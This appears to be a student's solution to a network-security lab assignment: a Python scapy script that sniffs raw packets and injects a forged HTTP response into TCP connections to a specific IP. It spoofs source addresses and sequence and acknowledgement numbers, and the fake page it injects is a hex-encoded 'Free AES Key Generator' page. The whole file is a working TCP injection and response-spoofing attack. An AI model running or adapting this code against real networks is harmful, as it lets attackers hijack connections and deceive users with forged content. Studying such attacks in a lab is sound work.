from scapy.all import send, conf, sendp,L3RawSocket
from scapy.all import TCP,IP,Ether
import socket

attack_payload = "\x48\x54\x54\x50\x2f\x31\x2e\x31\x20\x32\x30\x30\x20\x4f\x4b\x0d" \
"\x0a\x53\x65\x72\x76\x65\x72\x3a\x20\x6e\x67\x69\x6e\x78\x2f\x31" \
"\x2e\x31\x34\x2e\x30\x20\x28\x55\x62\x75\x6e\x74\x75\x29\x0d\x0a" \
"\x44\x61\x74\x65\x3a\x20\x53\x61\x74\x2c\x20\x33\x30\x20\x4f\x63" \
"\x74\x20\x32\x30\x32\x31\x20\x31\x39\x3a\x35\x39\x3a\x31\x34\x20" \
"\x47\x4d\x54\x0d\x0a\x43\x6f\x6e\x74\x65\x6e\x74\x2d\x54\x79\x70" \
"\x65\x3a\x20\x74\x65\x78\x74\x2f\x68\x74\x6d\x6c\x3b\x20\x63\x68" \
"\x61\x72\x73\x65\x74\x3d\x55\x54\x46\x2d\x38\x0d\x0a\x43\x6f\x6e" \
"\x74\x65\x6e\x74\x2d\x4c\x65\x6e\x67\x74\x68\x3a\x20\x33\x33\x35" \
"\x0d\x0a\x43\x6f\x6e\x6e\x65\x63\x74\x69\x6f\x6e\x3a\x20\x63\x6c" \
"\x6f\x73\x65\x0d\x0a\x0d\x0a\x3c\x68\x74\x6d\x6c\x3e\x0a\x3c\x68" \
"\x65\x61\x64\x3e\x0a\x20\x20\x3c\x74\x69\x74\x6c\x65\x3e\x46\x72" \
"\x65\x65\x20\x41\x45\x53\x20\x4b\x65\x79\x20\x47\x65\x6e\x65\x72" \
"\x61\x74\x6f\x72\x21\x3c\x2f\x74\x69\x74\x6c\x65\x3e\x0a\x3c\x2f" \
"\x68\x65\x61\x64\x3e\x0a\x3c\x62\x6f\x64\x79\x3e\x0a\x3c\x68\x31" \
"\x20\x73\x74\x79\x6c\x65\x3d\x22\x6d\x61\x72\x67\x69\x6e\x2d\x62" \
"\x6f\x74\x74\x6f\x6d\x3a\x20\x30\x70\x78\x22\x3e\x46\x72\x65\x65" \
"\x20\x41\x45\x53\x20\x4b\x65\x79\x20\x47\x65\x6e\x65\x72\x61\x74" \
"\x6f\x72\x21\x3c\x2f\x68\x31\x3e\x0a\x3c\x73\x70\x61\x6e\x20\x73" \
"\x74\x79\x6c\x65\x3d\x22\x66\x6f\x6e\x74\x2d\x73\x69\x7a\x65\x3a" \
"\x20\x35\x25\x22\x3e\x44\x65\x66\x69\x6e\x69\x74\x65\x6c\x79\x20" \
"\x6e\x6f\x74\x20\x72\x75\x6e\x20\x62\x79\x20\x74\x68\x65\x20\x4e" \
"\x53\x41\x2e\x3c\x2f\x73\x70\x61\x6e\x3e\x3c\x62\x72\x2f\x3e\x0a" \
"\x3c\x62\x72\x2f\x3e\x0a\x3c\x62\x72\x2f\x3e\x0a\x59\x6f\x75\x72" \
"\x20\x3c\x69\x3e\x66\x72\x65\x65\x3c\x2f\x69\x3e\x20\x41\x45\x53" \
"\x2d\x32\x35\x36\x20\x6b\x65\x79\x3a\x20\x3c\x62\x3e"\
"\x34\x64\x36\x31\x36\x37\x36\x39\x36\x33\x32\x30\x35\x37\x36\x66" \
"\x37\x32\x36\x34\x37\x33\x33\x61\x32\x30\x35\x33\x37\x31\x37\x35" \
"\x36\x35\x36\x31\x36\x64\x36\x39\x37\x33\x36\x38\x32\x30\x34\x66" \
"\x37\x33\x37\x33\x36\x39\x36\x36\x37\x32\x36\x31\x36\x37\x36\x35" \
"\x3c\x2f\x62\x3e\x3c\x62\x72\x2f\x3e\x0a\x3c\x2f\x62\x6f\x64\x79" \
"\x3e\x0a\x3c\x2f\x68\x74\x6d\x6c\x3e"

# Use this function to send packets
def inject_pkt(pkt):
    conf.L3socket=L3RawSocket
    send(pkt)

###
# edit this function to do your attack
###
got_template=0
frame = Ether()/IP()/TCP()
def handle_pkt(pkt):
    #print(pkt)
    global got_template
    global frame
    a=IP(pkt[14:])
    #print(a.show())
    #print('present',a[IP].dst,a[IP].src)
    
    if a[IP].dst=="18.234.115.5":
        payload= str(a[TCP].payload)
        if 'GET' in payload:
            ether=Ether(pkt[0:14])
            fake_ack = IP()/TCP()/attack_payload
            #fake_ack[Ether].dst=ether.src
            #fake_ack[Ether].src=ether.dst
            #fake_ack[Ether].type=ether.type
            #fake_ack[IP].src = "127.0.0.1"
            fake_ack[IP].src = a[IP].dst
            #fake_ack[IP].dst = "127.0.0.1"
            fake_ack[IP].dst = a[IP].src
            fake_ack[TCP].sport = a[TCP].dport
            fake_ack[TCP].dport = a[TCP].sport
            fake_ack[TCP].seq = a[TCP].ack
            fake_ack[TCP].flags=0x018
            fake_ack[TCP].window=65535
            fake_ack[TCP].ack = a[TCP].seq + len(a[TCP].payload)
            #fake_ack[TCP].payload = attack_payload
            #fake_ack.show2()
            #send(fake_ack)
            #sendp(fake_ack,iface="lo")
            #print(fake_ack)
            inject_pkt(fake_ack)
    #if a[IP].src=="18.234.115.5" or a[IP].dst=="18.234.115.5":
    #    if a.haslayer(TCP):
            #print(a[TCP].payload)
    #        print('payload',len(a['TCP'].payload),'seq',a[TCP].seq,'ack',a[TCP].ack,a[IP].src)
            #send(a)
            #return 1
    #b=a.getlayer(UDP)
    #print(b.show())
    
    pass

def main():
    s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, 0x0300)
    while True:
        pkt = s.recv(0xffff)
        #pkt=sniff(count=1)
        ret=handle_pkt(pkt)
        if ret==1:
            break
if __name__=='__main__':
    main()
